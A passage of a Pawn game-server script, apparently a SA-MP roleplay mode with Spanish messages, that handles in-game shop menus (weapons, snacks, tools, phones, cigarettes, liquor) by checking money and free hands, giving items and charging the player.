				if(PlayerInfo[playerid][pManoDer] != 0 && PlayerInfo[playerid][pManoIzq] != 0){SendClientMessage(playerid, Rojo, "* Tienes ambas manos ocupadas."); return 1;}
				if(PlayerInfo[playerid][pManoDer] == 0){PonerObjeto(playerid, 1, objeto); PlayerInfo[playerid][pManoDer] = objeto, GivePlayerWeapon(playerid, ObjetoInfo[objeto][IDArma], ObjetoInfo[objeto][Capacidad]), PlayerInfo[playerid][pManoDerCant] = ObjetoInfo[objeto][Capacidad];}
				else if(PlayerInfo[playerid][pManoIzq] == 0){PonerObjeto(playerid, 2, objeto); PlayerInfo[playerid][pManoIzq] = objeto, PlayerInfo[playerid][pManoIzqCant] = ObjetoInfo[objeto][Capacidad];}
				format(string, sizeof(string), "Has comprado un/a %s por %d$.", ObjetoInfo[objeto][NombreObjeto], precio);
				SendClientMessage(playerid, Verde, string);
				GivePlayerMoneyAC(playerid, -precio);
                HideMenuForPlayer(ammunation, playerid);
            }
            case 6: //Cargador Remington 700
            {
                new precio = 500, objeto = 46;
				if(GetPlayerMoney(playerid) < precio){SendClientMessage(playerid, Rojo, "* No tienes suficiente dinero."); return 1;}
				if(PlayerInfo[playerid][pManoDer] != 0 && PlayerInfo[playerid][pManoIzq] != 0){SendClientMessage(playerid, Rojo, "* Tienes ambas manos ocupadas."); return 1;}
				if(PlayerInfo[playerid][pManoDer] == 0){PonerObjeto(playerid, 1, objeto); PlayerInfo[playerid][pManoDer] = objeto, PlayerInfo[playerid][pManoDerCant] = ObjetoInfo[objeto][Capacidad];}
				else if(PlayerInfo[playerid][pManoIzq] == 0){PonerObjeto(playerid, 2, objeto); PlayerInfo[playerid][pManoIzq] = objeto, PlayerInfo[playerid][pManoIzqCant] = ObjetoInfo[objeto][Capacidad];}
				format(string, sizeof(string), "Has comprado un/a %s por %d$.", ObjetoInfo[objeto][NombreObjeto], precio);
				SendClientMessage(playerid, Verde, string);
				GivePlayerMoneyAC(playerid, -precio);
                HideMenuForPlayer(ammunation, playerid);
            }
            case 7: //Balas 7.62x51mm
            {
                new precio = 1200, objeto = 53;
				if(GetPlayerMoney(playerid) < precio){SendClientMessage(playerid, Rojo, "* No tienes suficiente dinero."); return 1;}
				if(PlayerInfo[playerid][pManoDer] != 0 && PlayerInfo[playerid][pManoIzq] != 0){SendClientMessage(playerid, Rojo, "* Tienes ambas manos ocupadas."); return 1;}
				if(PlayerInfo[playerid][pManoDer] == 0){PonerObjeto(playerid, 1, objeto); PlayerInfo[playerid][pManoDer] = objeto, PlayerInfo[playerid][pManoDerCant] = ObjetoInfo[objeto][Capacidad];}
				else if(PlayerInfo[playerid][pManoIzq] == 0){PonerObjeto(playerid, 2, objeto); PlayerInfo[playerid][pManoIzq] = objeto, PlayerInfo[playerid][pManoIzqCant] = ObjetoInfo[objeto][Capacidad];}
				format(string, sizeof(string), "Has comprado un/a %s por %d$.", ObjetoInfo[objeto][NombreObjeto], precio);
				SendClientMessage(playerid, Verde, string);
				GivePlayerMoneyAC(playerid, -precio);
                HideMenuForPlayer(ammunation, playerid);
            }
            case 8: //Salir
            {
				HideMenuForPlayer(ammunation, playerid);
            }
        }
    }
    if(GetPlayerMenu(playerid) == menu247) //Tienda 24/7
    {
        TogglePlayerControllable(playerid, 1);
        switch(row)
        {
            case 0: //Bolsa de doritos
            {
                new precio = 20, objeto = 55;
				if(GetPlayerMoney(playerid) < precio){SendClientMessage(playerid, Rojo, "* No tienes suficiente dinero."); return 1;}
				if(PlayerInfo[playerid][pManoDer] != 0 && PlayerInfo[playerid][pManoIzq] != 0){SendClientMessage(playerid, Rojo, "* Tienes ambas manos ocupadas."); return 1;}
				if(PlayerInfo[playerid][pManoDer] == 0){PonerObjeto(playerid, 1, objeto); PlayerInfo[playerid][pManoDer] = objeto, PlayerInfo[playerid][pManoDerCant] = ObjetoInfo[objeto][Capacidad];}
				else if(PlayerInfo[playerid][pManoIzq] == 0){PonerObjeto(playerid, 2, objeto); PlayerInfo[playerid][pManoIzq] = objeto, PlayerInfo[playerid][pManoIzqCant] = ObjetoInfo[objeto][Capacidad];}
				format(string, sizeof(string), "Has comprado un/a %s por %d$.", ObjetoInfo[objeto][NombreObjeto], precio);
				SendClientMessage(playerid, Verde, string);
				GivePlayerMoneyAC(playerid, -precio);
                HideMenuForPlayer(menu247, playerid);
            }
            case 1: //Bolsa de patatas
            {
                new precio = 20, objeto = 56;
				if(GetPlayerMoney(playerid) < precio){SendClientMessage(playerid, Rojo, "* No tienes suficiente dinero."); return 1;}
				if(PlayerInfo[playerid][pManoDer] != 0 && PlayerInfo[playerid][pManoIzq] != 0){SendClientMessage(playerid, Rojo, "* Tienes ambas manos ocupadas."); return 1;}
				if(PlayerInfo[playerid][pManoDer] == 0){PonerObjeto(playerid, 1, objeto); PlayerInfo[playerid][pManoDer] = objeto, PlayerInfo[playerid][pManoDerCant] = ObjetoInfo[objeto][Capacidad];}
				else if(PlayerInfo[playerid][pManoIzq] == 0){PonerObjeto(playerid, 2, objeto); PlayerInfo[playerid][pManoIzq] = objeto, PlayerInfo[playerid][pManoIzqCant] = ObjetoInfo[objeto][Capacidad];}
				format(string, sizeof(string), "Has comprado un/a %s por %d$.", ObjetoInfo[objeto][NombreObjeto], precio);
				SendClientMessage(playerid, Verde, string);
				GivePlayerMoneyAC(playerid, -precio);
                HideMenuForPlayer(menu247, playerid);
            }
            case 2: //Bolsa de nachos
            {
                new precio = 20, objeto = 57;
				if(GetPlayerMoney(playerid) < precio){SendClientMessage(playerid, Rojo, "* No tienes suficiente dinero."); return 1;}
				if(PlayerInfo[playerid][pManoDer] != 0 && PlayerInfo[playerid][pManoIzq] != 0){SendClientMessage(playerid, Rojo, "* Tienes ambas manos ocupadas."); return 1;}
				if(PlayerInfo[playerid][pManoDer] == 0){PonerObjeto(playerid, 1, objeto); PlayerInfo[playerid][pManoDer] = objeto, PlayerInfo[playerid][pManoDerCant] = ObjetoInfo[objeto][Capacidad];}
				else if(PlayerInfo[playerid][pManoIzq] == 0){PonerObjeto(playerid, 2, objeto); PlayerInfo[playerid][pManoIzq] = objeto, PlayerInfo[playerid][pManoIzqCant] = ObjetoInfo[objeto][Capacidad];}
                format(string, sizeof(string), "Has comprado un/a %s por %d$.", ObjetoInfo[objeto][NombreObjeto], precio);
				SendClientMessage(playerid, Verde, string);
				GivePlayerMoneyAC(playerid, -precio);
				HideMenuForPlayer(menu247, playerid);
            }
            case 3: //Lata sprunk
            {
                new precio = 13, objeto = 58;
				if(GetPlayerMoney(playerid) < precio){SendClientMessage(playerid, Rojo, "* No tienes suficiente dinero."); return 1;}
				if(PlayerInfo[playerid][pManoDer] != 0 && PlayerInfo[playerid][pManoIzq] != 0){SendClientMessage(playerid, Rojo, "* Tienes ambas manos ocupadas."); return 1;}
				if(PlayerInfo[playerid][pManoDer] == 0){PonerObjeto(playerid, 1, objeto); PlayerInfo[playerid][pManoDer] = objeto, PlayerInfo[playerid][pManoDerCant] = ObjetoInfo[objeto][Capacidad];}
				else if(PlayerInfo[playerid][pManoIzq] == 0){PonerObjeto(playerid, 2, objeto); PlayerInfo[playerid][pManoIzq] = objeto, PlayerInfo[playerid][pManoIzqCant] = ObjetoInfo[objeto][Capacidad];}
                format(string, sizeof(string), "Has comprado un/a %s por %d$.", ObjetoInfo[objeto][NombreObjeto], precio);
				SendClientMessage(playerid, Verde, string);
				GivePlayerMoneyAC(playerid, -precio);
				HideMenuForPlayer(menu247, playerid);
            }
            case 4: //Lata fanta
            {
                new precio = 13, objeto = 59;
				if(GetPlayerMoney(playerid) < precio){SendClientMessage(playerid, Rojo, "* No tienes suficiente dinero."); return 1;}
				if(PlayerInfo[playerid][pManoDer] != 0 && PlayerInfo[playerid][pManoIzq] != 0){SendClientMessage(playerid, Rojo, "* Tienes ambas manos ocupadas."); return 1;}
				if(PlayerInfo[playerid][pManoDer] == 0){PonerObjeto(playerid, 1, objeto); PlayerInfo[playerid][pManoDer] = objeto, PlayerInfo[playerid][pManoDerCant] = ObjetoInfo[objeto][Capacidad];}
				else if(PlayerInfo[playerid][pManoIzq] == 0){PonerObjeto(playerid, 2, objeto); PlayerInfo[playerid][pManoIzq] = objeto, PlayerInfo[playerid][pManoIzqCant] = ObjetoInfo[objeto][Capacidad];}
                format(string, sizeof(string), "Has comprado un/a %s por %d$.", ObjetoInfo[objeto][NombreObjeto], precio);
				SendClientMessage(playerid, Verde, string);
				GivePlayerMoneyAC(playerid, -precio);
				HideMenuForPlayer(menu247, playerid);
            }
            case 5: //Botella agua
            {
                new precio = 10, objeto = 60;
				if(GetPlayerMoney(playerid) < precio){SendClientMessage(playerid, Rojo, "* No tienes suficiente dinero."); return 1;}
				if(PlayerInfo[playerid][pManoDer] != 0 && PlayerInfo[playerid][pManoIzq] != 0){SendClientMessage(playerid, Rojo, "* Tienes ambas manos ocupadas."); return 1;}
				if(PlayerInfo[playerid][pManoDer] == 0){PonerObjeto(playerid, 1, objeto); PlayerInfo[playerid][pManoDer] = objeto, PlayerInfo[playerid][pManoDerCant] = ObjetoInfo[objeto][Capacidad];}
				else if(PlayerInfo[playerid][pManoIzq] == 0){PonerObjeto(playerid, 2, objeto); PlayerInfo[playerid][pManoIzq] = objeto, PlayerInfo[playerid][pManoIzqCant] = ObjetoInfo[objeto][Capacidad];}
                format(string, sizeof(string), "Has comprado un/a %s por %d$.", ObjetoInfo[objeto][NombreObjeto], precio);
				SendClientMessage(playerid, Verde, string);
				GivePlayerMoneyAC(playerid, -precio);
				HideMenuForPlayer(menu247, playerid);
            }
            case 6: //Botella cerveza
            {
                new precio = 15, objeto = 61;
				if(GetPlayerMoney(playerid) < precio){SendClientMessage(playerid, Rojo, "* No tienes suficiente dinero."); return 1;}
				if(PlayerInfo[playerid][pManoDer] != 0 && PlayerInfo[playerid][pManoIzq] != 0){SendClientMessage(playerid, Rojo, "* Tienes ambas manos ocupadas."); return 1;}
				if(PlayerInfo[playerid][pManoDer] == 0){PonerObjeto(playerid, 1, objeto); PlayerInfo[playerid][pManoDer] = objeto, PlayerInfo[playerid][pManoDerCant] = ObjetoInfo[objeto][Capacidad];}
				else if(PlayerInfo[playerid][pManoIzq] == 0){PonerObjeto(playerid, 2, objeto); PlayerInfo[playerid][pManoIzq] = objeto, PlayerInfo[playerid][pManoIzqCant] = ObjetoInfo[objeto][Capacidad];}
                format(string, sizeof(string), "Has comprado un/a %s por %d$.", ObjetoInfo[objeto][NombreObjeto], precio);
				SendClientMessage(playerid, Verde, string);
				GivePlayerMoneyAC(playerid, -precio);
				HideMenuForPlayer(menu247, playerid);
            }
            case 7: //Salir
            {
				HideMenuForPlayer(menu247, playerid);
            }
        }
    }
    if(GetPlayerMenu(playerid) == tiendadeportes) //Tienda de deportes
    {
        TogglePlayerControllable(playerid, 1);
        switch(row)
        {
            case 0: //Bate
            {
                new precio = 50, objeto = 5;
				if(GetPlayerMoney(playerid) < precio){SendClientMessage(playerid, Rojo, "* No tienes suficiente dinero."); return 1;}
				if(PlayerInfo[playerid][pManoDer] != 0 && PlayerInfo[playerid][pManoIzq] != 0){SendClientMessage(playerid, Rojo, "* Tienes ambas manos ocupadas."); return 1;}
				if(PlayerInfo[playerid][pManoDer] == 0){PonerObjeto(playerid, 1, objeto); PlayerInfo[playerid][pManoDer] = objeto, GivePlayerWeapon(playerid, ObjetoInfo[objeto][IDArma], ObjetoInfo[objeto][Capacidad]), PlayerInfo[playerid][pManoDerCant] = ObjetoInfo[objeto][Capacidad];}
				else if(PlayerInfo[playerid][pManoIzq] == 0){PonerObjeto(playerid, 2, objeto); PlayerInfo[playerid][pManoIzq] = objeto, PlayerInfo[playerid][pManoIzqCant] = ObjetoInfo[objeto][Capacidad];}
				format(string, sizeof(string), "Has comprado un/a %s por %d$.", ObjetoInfo[objeto][NombreObjeto], precio);
				SendClientMessage(playerid, Verde, string);
				GivePlayerMoneyAC(playerid, -precio);
                HideMenuForPlayer(tiendadeportes, playerid);
            }
            case 1: //Palo de golf
            {
                new precio = 70, objeto = 2;
				if(GetPlayerMoney(playerid) < precio){SendClientMessage(playerid, Rojo, "* No tienes suficiente dinero."); return 1;}
				if(PlayerInfo[playerid][pManoDer] != 0 && PlayerInfo[playerid][pManoIzq] != 0){SendClientMessage(playerid, Rojo, "* Tienes ambas manos ocupadas."); return 1;}
				if(PlayerInfo[playerid][pManoDer] == 0){PonerObjeto(playerid, 1, objeto); PlayerInfo[playerid][pManoDer] = objeto, GivePlayerWeapon(playerid, ObjetoInfo[objeto][IDArma], ObjetoInfo[objeto][Capacidad]), PlayerInfo[playerid][pManoDerCant] = ObjetoInfo[objeto][Capacidad];}
				else if(PlayerInfo[playerid][pManoIzq] == 0){PonerObjeto(playerid, 2, objeto); PlayerInfo[playerid][pManoIzq] = objeto, PlayerInfo[playerid][pManoIzqCant] = ObjetoInfo[objeto][Capacidad];}
				format(string, sizeof(string), "Has comprado un/a %s por %d$.", ObjetoInfo[objeto][NombreObjeto], precio);
				SendClientMessage(playerid, Verde, string);
				GivePlayerMoneyAC(playerid, -precio);
                HideMenuForPlayer(tiendadeportes, playerid);
            }
            case 2: //Palo de billar
            {
                new precio = 60, objeto = 7;
				if(GetPlayerMoney(playerid) < precio){SendClientMessage(playerid, Rojo, "* No tienes suficiente dinero."); return 1;}
				if(PlayerInfo[playerid][pManoDer] != 0 && PlayerInfo[playerid][pManoIzq] != 0){SendClientMessage(playerid, Rojo, "* Tienes ambas manos ocupadas."); return 1;}
				if(PlayerInfo[playerid][pManoDer] == 0){PonerObjeto(playerid, 1, objeto); PlayerInfo[playerid][pManoDer] = objeto, GivePlayerWeapon(playerid, ObjetoInfo[objeto][IDArma], ObjetoInfo[objeto][Capacidad]), PlayerInfo[playerid][pManoDerCant] = ObjetoInfo[objeto][Capacidad];}
				else if(PlayerInfo[playerid][pManoIzq] == 0){PonerObjeto(playerid, 2, objeto); PlayerInfo[playerid][pManoIzq] = objeto, PlayerInfo[playerid][pManoIzqCant] = ObjetoInfo[objeto][Capacidad];}
                format(string, sizeof(string), "Has comprado un/a %s por %d$.", ObjetoInfo[objeto][NombreObjeto], precio);
				SendClientMessage(playerid, Verde, string);
				GivePlayerMoneyAC(playerid, -precio);
				HideMenuForPlayer(tiendadeportes, playerid);
            }
            case 3: //Salir
            {
				HideMenuForPlayer(tiendadeportes, playerid);
            }
        }
    }
    if(GetPlayerMenu(playerid) == ferreteria) //Ferretería
    {
        TogglePlayerControllable(playerid, 1);
        switch(row)
        {
            case 0: //Palanca
            {
                new precio = 100, objeto = 15;
				if(GetPlayerMoney(playerid) < precio){SendClientMessage(playerid, Rojo, "* No tienes suficiente dinero."); return 1;}
				if(PlayerInfo[playerid][pManoDer] != 0 && PlayerInfo[playerid][pManoIzq] != 0){SendClientMessage(playerid, Rojo, "* Tienes ambas manos ocupadas."); return 1;}
				if(PlayerInfo[playerid][pManoDer] == 0){PonerObjeto(playerid, 1, objeto); PlayerInfo[playerid][pManoDer] = objeto, GivePlayerWeapon(playerid, ObjetoInfo[objeto][IDArma], ObjetoInfo[objeto][Capacidad]), PlayerInfo[playerid][pManoDerCant] = ObjetoInfo[objeto][Capacidad];}
				else if(PlayerInfo[playerid][pManoIzq] == 0){PonerObjeto(playerid, 2, objeto); PlayerInfo[playerid][pManoIzq] = objeto, PlayerInfo[playerid][pManoIzqCant] = ObjetoInfo[objeto][Capacidad];}
				format(string, sizeof(string), "Has comprado un/a %s por %d$.", ObjetoInfo[objeto][NombreObjeto], precio);
				SendClientMessage(playerid, Verde, string);
				GivePlayerMoneyAC(playerid, -precio);
                HideMenuForPlayer(ferreteria, playerid);
            }
            case 1: //Cuchillo
            {
                if(PlayerInfo[playerid][pNivel] < 2){HideMenuForPlayer(ferreteria, playerid); SendClientMessage(playerid, Rojo, "* Debes ser nivel 2 para comprar este objeto."); return 1;}
                new precio = 100, objeto = 4;
				if(GetPlayerMoney(playerid) < precio){SendClientMessage(playerid, Rojo, "* No tienes suficiente dinero."); return 1;}
				if(PlayerInfo[playerid][pManoDer] != 0 && PlayerInfo[playerid][pManoIzq] != 0){SendClientMessage(playerid, Rojo, "* Tienes ambas manos ocupadas."); return 1;}
				if(PlayerInfo[playerid][pManoDer] == 0){PonerObjeto(playerid, 1, objeto); PlayerInfo[playerid][pManoDer] = objeto, GivePlayerWeapon(playerid, ObjetoInfo[objeto][IDArma], ObjetoInfo[objeto][Capacidad]), PlayerInfo[playerid][pManoDerCant] = ObjetoInfo[objeto][Capacidad];}
				else if(PlayerInfo[playerid][pManoIzq] == 0){PonerObjeto(playerid, 2, objeto); PlayerInfo[playerid][pManoIzq] = objeto, PlayerInfo[playerid][pManoIzqCant] = ObjetoInfo[objeto][Capacidad];}
				format(string, sizeof(string), "Has comprado un/a %s por %d$.", ObjetoInfo[objeto][NombreObjeto], precio);
				SendClientMessage(playerid, Verde, string);
				GivePlayerMoneyAC(playerid, -precio);
                HideMenuForPlayer(ferreteria, playerid);
            }
            case 2: //Destornillador
            {
                new precio = 20, objeto = 74;
				if(GetPlayerMoney(playerid) < precio){SendClientMessage(playerid, Rojo, "* No tienes suficiente dinero."); return 1;}
				if(PlayerInfo[playerid][pManoDer] != 0 && PlayerInfo[playerid][pManoIzq] != 0){SendClientMessage(playerid, Rojo, "* Tienes ambas manos ocupadas."); return 1;}
				if(PlayerInfo[playerid][pManoDer] == 0){PonerObjeto(playerid, 1, objeto); PlayerInfo[playerid][pManoDer] = objeto, PlayerInfo[playerid][pManoDerCant] = ObjetoInfo[objeto][Capacidad];}
				else if(PlayerInfo[playerid][pManoIzq] == 0){PonerObjeto(playerid, 2, objeto); PlayerInfo[playerid][pManoIzq] = objeto, PlayerInfo[playerid][pManoIzqCant] = ObjetoInfo[objeto][Capacidad];}
				format(string, sizeof(string), "Has comprado un/a %s por %d$.", ObjetoInfo[objeto][NombreObjeto], precio);
				SendClientMessage(playerid, Verde, string);
				GivePlayerMoneyAC(playerid, -precio);
                HideMenuForPlayer(ferreteria, playerid);
            }
            case 3: //Extintor
            {
                new precio = 300, objeto = 35;
				if(GetPlayerMoney(playerid) < precio){SendClientMessage(playerid, Rojo, "* No tienes suficiente dinero."); return 1;}
				if(PlayerInfo[playerid][pManoDer] != 0 && PlayerInfo[playerid][pManoIzq] != 0){SendClientMessage(playerid, Rojo, "* Tienes ambas manos ocupadas."); return 1;}
				if(PlayerInfo[playerid][pManoDer] == 0){PonerObjeto(playerid, 1, objeto); PlayerInfo[playerid][pManoDer] = objeto, GivePlayerWeapon(playerid, ObjetoInfo[objeto][IDArma], ObjetoInfo[objeto][Capacidad]), PlayerInfo[playerid][pManoDerCant] = ObjetoInfo[objeto][Capacidad];}
				else if(PlayerInfo[playerid][pManoIzq] == 0){PonerObjeto(playerid, 2, objeto); PlayerInfo[playerid][pManoIzq] = objeto, PlayerInfo[playerid][pManoIzqCant] = ObjetoInfo[objeto][Capacidad];}
				format(string, sizeof(string), "Has comprado un/a %s por %d$.", ObjetoInfo[objeto][NombreObjeto], precio);
				SendClientMessage(playerid, Verde, string);
				GivePlayerMoneyAC(playerid, -precio);
                HideMenuForPlayer(ferreteria, playerid);
            }
            case 4: //Spray
            {
                new precio = 150, objeto = 34;
				if(GetPlayerMoney(playerid) < precio){SendClientMessage(playerid, Rojo, "* No tienes suficiente dinero."); return 1;}
				if(PlayerInfo[playerid][pManoDer] != 0 && PlayerInfo[playerid][pManoIzq] != 0){SendClientMessage(playerid, Rojo, "* Tienes ambas manos ocupadas."); return 1;}
				if(PlayerInfo[playerid][pManoDer] == 0){PonerObjeto(playerid, 1, objeto); PlayerInfo[playerid][pManoDer] = objeto, GivePlayerWeapon(playerid, ObjetoInfo[objeto][IDArma], ObjetoInfo[objeto][Capacidad]), PlayerInfo[playerid][pManoDerCant] = ObjetoInfo[objeto][Capacidad];}
				else if(PlayerInfo[playerid][pManoIzq] == 0){PonerObjeto(playerid, 2, objeto); PlayerInfo[playerid][pManoIzq] = objeto, PlayerInfo[playerid][pManoIzqCant] = ObjetoInfo[objeto][Capacidad];}
				format(string, sizeof(string), "Has comprado un/a %s por %d$.", ObjetoInfo[objeto][NombreObjeto], precio);
				SendClientMessage(playerid, Verde, string);
				GivePlayerMoneyAC(playerid, -precio);
                HideMenuForPlayer(ferreteria, playerid);
            }
            case 5: //Pala
            {
                new precio = 60, objeto = 6;
				if(GetPlayerMoney(playerid) < precio){SendClientMessage(playerid, Rojo, "* No tienes suficiente dinero."); return 1;}
				if(PlayerInfo[playerid][pManoDer] != 0 && PlayerInfo[playerid][pManoIzq] != 0){SendClientMessage(playerid, Rojo, "* Tienes ambas manos ocupadas."); return 1;}
				if(PlayerInfo[playerid][pManoDer] == 0){PonerObjeto(playerid, 1, objeto); PlayerInfo[playerid][pManoDer] = objeto, GivePlayerWeapon(playerid, ObjetoInfo[objeto][IDArma], ObjetoInfo[objeto][Capacidad]), PlayerInfo[playerid][pManoDerCant] = ObjetoInfo[objeto][Capacidad];}
				else if(PlayerInfo[playerid][pManoIzq] == 0){PonerObjeto(playerid, 2, objeto); PlayerInfo[playerid][pManoIzq] = objeto, PlayerInfo[playerid][pManoIzqCant] = ObjetoInfo[objeto][Capacidad];}
				format(string, sizeof(string), "Has comprado un/a %s por %d$.", ObjetoInfo[objeto][NombreObjeto], precio);
				SendClientMessage(playerid, Verde, string);
				GivePlayerMoneyAC(playerid, -precio);
                HideMenuForPlayer(ferreteria, playerid);
            }
            case 6: //Salir
            {
				HideMenuForPlayer(ferreteria, playerid);
            }
        }
    }
    if(GetPlayerMenu(playerid) == tiendaropa) //Tiendas de ropa
    {
        TogglePlayerControllable(playerid, 1);
        switch(row)
        {
            case 0: //Skin
            {
                ShowModelSelectionMenu(playerid, ropa, "Lista de skins", AguamarinaOscuro, Blanco, Amarillo);
            }
            case 1: //Salir
            {
				HideMenuForPlayer(tiendaropa, playerid);
            }
        }
    }
    if(GetPlayerMenu(playerid) == electronica) //Tienda electrónica
    {
        TogglePlayerControllable(playerid, 1);
        switch(row)
        {
            case 0: //Móvil
            {
                new precio = 400, objeto = 68;
				if(GetPlayerMoney(playerid) < precio){SendClientMessage(playerid, Rojo, "* No tienes suficiente dinero."); return 1;}
				if(PlayerInfo[playerid][pManoDer] != 0 && PlayerInfo[playerid][pManoIzq] != 0){SendClientMessage(playerid, Rojo, "* Tienes ambas manos ocupadas."); return 1;}
				if(PlayerInfo[playerid][pManoDer] == 0){PonerObjeto(playerid, 1, objeto); PlayerInfo[playerid][pManoDer] = objeto, PlayerInfo[playerid][pManoDerCant] = ObjetoInfo[objeto][Capacidad];}
				else if(PlayerInfo[playerid][pManoIzq] == 0){PonerObjeto(playerid, 2, objeto); PlayerInfo[playerid][pManoIzq] = objeto, PlayerInfo[playerid][pManoIzqCant] = ObjetoInfo[objeto][Capacidad];}
				format(string, sizeof(string), "Has comprado un/a %s por %d$.", ObjetoInfo[objeto][NombreObjeto], precio);
				SendClientMessage(playerid, Verde, string);
				GivePlayerMoneyAC(playerid, -precio);
                HideMenuForPlayer(electronica, playerid);
                new randphone = 100000 + random(899999); //Crea número de teléfono entre el 100000 y el 999999
				PlayerInfo[playerid][pTelefono] = randphone;
				format(string, sizeof(string), "Ahora tu número de teléfono es el %d", randphone);
				SendClientMessage(playerid, Blanco, string);
				SendClientMessage(playerid, Blanco, "Recuerda que puedes cambiar de número comprando otro teléfono.");
            }
            case 1: //Cámara
            {
                new precio = 40, objeto = 36;
				if(GetPlayerMoney(playerid) < precio){SendClientMessage(playerid, Rojo, "* No tienes suficiente dinero."); return 1;}
				if(PlayerInfo[playerid][pManoDer] != 0 && PlayerInfo[playerid][pManoIzq] != 0){SendClientMessage(playerid, Rojo, "* Tienes ambas manos ocupadas."); return 1;}
				if(PlayerInfo[playerid][pManoDer] == 0){PonerObjeto(playerid, 1, objeto); PlayerInfo[playerid][pManoDer] = objeto, GivePlayerWeapon(playerid, ObjetoInfo[objeto][IDArma], ObjetoInfo[objeto][Capacidad]), PlayerInfo[playerid][pManoDerCant] = ObjetoInfo[objeto][Capacidad];}
				else if(PlayerInfo[playerid][pManoIzq] == 0){PonerObjeto(playerid, 2, objeto); PlayerInfo[playerid][pManoIzq] = objeto, PlayerInfo[playerid][pManoIzqCant] = ObjetoInfo[objeto][Capacidad];}
				format(string, sizeof(string), "Has comprado un/a %s por %d$.", ObjetoInfo[objeto][NombreObjeto], precio);
				SendClientMessage(playerid, Verde, string);
				GivePlayerMoneyAC(playerid, -precio);
                HideMenuForPlayer(ferreteria, playerid);
            }
            case 2: //Reloj casio digital 1
            {
                new precio = 40, objeto = 92;
				if(GetPlayerMoney(playerid) < precio){SendClientMessage(playerid, Rojo, "* No tienes suficiente dinero."); return 1;}
				if(PlayerInfo[playerid][pManoDer] != 0 && PlayerInfo[playerid][pManoIzq] != 0){SendClientMessage(playerid, Rojo, "* Tienes ambas manos ocupadas."); return 1;}
				if(PlayerInfo[playerid][pManoDer] == 0){PonerObjeto(playerid, 1, objeto); PlayerInfo[playerid][pManoDer] = objeto, PlayerInfo[playerid][pManoDerCant] = ObjetoInfo[objeto][Capacidad];}
				else if(PlayerInfo[playerid][pManoIzq] == 0){PonerObjeto(playerid, 2, objeto); PlayerInfo[playerid][pManoIzq] = objeto, PlayerInfo[playerid][pManoIzqCant] = ObjetoInfo[objeto][Capacidad];}
				format(string, sizeof(string), "Has comprado un/a %s por %d$.", ObjetoInfo[objeto][NombreObjeto], precio);
				SendClientMessage(playerid, Verde, string);
				GivePlayerMoneyAC(playerid, -precio);
                HideMenuForPlayer(ferreteria, playerid);
            }
            case 3: //Salir
            {
				HideMenuForPlayer(electronica, playerid);
            }
        }
    }
    if(GetPlayerMenu(playerid) == estanco) //Estanco
    {
        TogglePlayerControllable(playerid, 1);
        switch(row)
        {
            case 0: //Caja cigarrillos
            {
                new precio = 20, objeto = 70;
				if(GetPlayerMoney(playerid) < precio){SendClientMessage(playerid, Rojo, "* No tienes suficiente dinero."); return 1;}
				if(PlayerInfo[playerid][pManoDer] != 0 && PlayerInfo[playerid][pManoIzq] != 0){SendClientMessage(playerid, Rojo, "* Tienes ambas manos ocupadas."); return 1;}
				if(PlayerInfo[playerid][pManoDer] == 0){PonerObjeto(playerid, 1, objeto); PlayerInfo[playerid][pManoDer] = objeto, PlayerInfo[playerid][pManoDerCant] = ObjetoInfo[objeto][Capacidad];}
				else if(PlayerInfo[playerid][pManoIzq] == 0){PonerObjeto(playerid, 2, objeto); PlayerInfo[playerid][pManoIzq] = objeto, PlayerInfo[playerid][pManoIzqCant] = ObjetoInfo[objeto][Capacidad];}
				format(string, sizeof(string), "Has comprado un/a %s por %d$.", ObjetoInfo[objeto][NombreObjeto], precio);
				SendClientMessage(playerid, Verde, string);
				GivePlayerMoneyAC(playerid, -precio);
                HideMenuForPlayer(estanco, playerid);
            }
            case 1: //Mechero
            {
				new precio = 15, objeto = 69;
				if(GetPlayerMoney(playerid) < precio){SendClientMessage(playerid, Rojo, "* No tienes suficiente dinero."); return 1;}
				if(PlayerInfo[playerid][pManoDer] != 0 && PlayerInfo[playerid][pManoIzq] != 0){SendClientMessage(playerid, Rojo, "* Tienes ambas manos ocupadas."); return 1;}
				if(PlayerInfo[playerid][pManoDer] == 0){PonerObjeto(playerid, 1, objeto); PlayerInfo[playerid][pManoDer] = objeto, PlayerInfo[playerid][pManoDerCant] = ObjetoInfo[objeto][Capacidad];}
				else if(PlayerInfo[playerid][pManoIzq] == 0){PonerObjeto(playerid, 2, objeto); PlayerInfo[playerid][pManoIzq] = objeto, PlayerInfo[playerid][pManoIzqCant] = ObjetoInfo[objeto][Capacidad];}
				format(string, sizeof(string), "Has comprado un/a %s por %d$.", ObjetoInfo[objeto][NombreObjeto], precio);
				SendClientMessage(playerid, Verde, string);
				GivePlayerMoneyAC(playerid, -precio);
                HideMenuForPlayer(estanco, playerid);
            }
            case 2: //Salir
            {
				HideMenuForPlayer(estanco, playerid);
            }
        }
    }
    if(GetPlayerMenu(playerid) == licoreria) //Licorería
    {
        TogglePlayerControllable(playerid, 1);
        switch(row)
        {
            case 0: //Botella Whisky
            {
                new precio = 30, objeto = 72;
				if(GetPlayerMoney(playerid) < precio){SendClientMessage(playerid, Rojo, "* No tienes suficiente dinero."); return 1;}
				if(PlayerInfo[playerid][pManoDer] != 0 && PlayerInfo[playerid][pManoIzq] != 0){SendClientMessage(playerid, Rojo, "* Tienes ambas manos ocupadas."); return 1;}
				if(PlayerInfo[playerid][pManoDer] == 0){PonerObjeto(playerid, 1, objeto); PlayerInfo[playerid][pManoDer] = objeto, PlayerInfo[playerid][pManoDerCant] = ObjetoInfo[objeto][Capacidad];}
				else if(PlayerInfo[playerid][pManoIzq] == 0){PonerObjeto(playerid, 2, objeto); PlayerInfo[playerid][pManoIzq] = objeto, PlayerInfo[playerid][pManoIzqCant] = ObjetoInfo[objeto][Capacidad];}
				format(string, sizeof(string), "Has comprado un/a %s por %d$.", ObjetoInfo[objeto][NombreObjeto], precio);
				SendClientMessage(playerid, Verde, string);
				GivePlayerMoneyAC(playerid, -precio);
                HideMenuForPlayer(licoreria, playerid);
            }
            case 1: //Botella Ron
            {
                new precio = 30, objeto = 71;
				if(GetPlayerMoney(playerid) < precio){SendClientMessage(playerid, Rojo, "* No tienes suficiente dinero."); return 1;}
				if(PlayerInfo[playerid][pManoDer] != 0 && PlayerInfo[playerid][pManoIzq] != 0){SendClientMessage(playerid, Rojo, "* Tienes ambas manos ocupadas."); return 1;}
				if(PlayerInfo[playerid][pManoDer] == 0){PonerObjeto(playerid, 1, objeto); PlayerInfo[playerid][pManoDer] = objeto, PlayerInfo[playerid][pManoDerCant] = ObjetoInfo[objeto][Capacidad];}
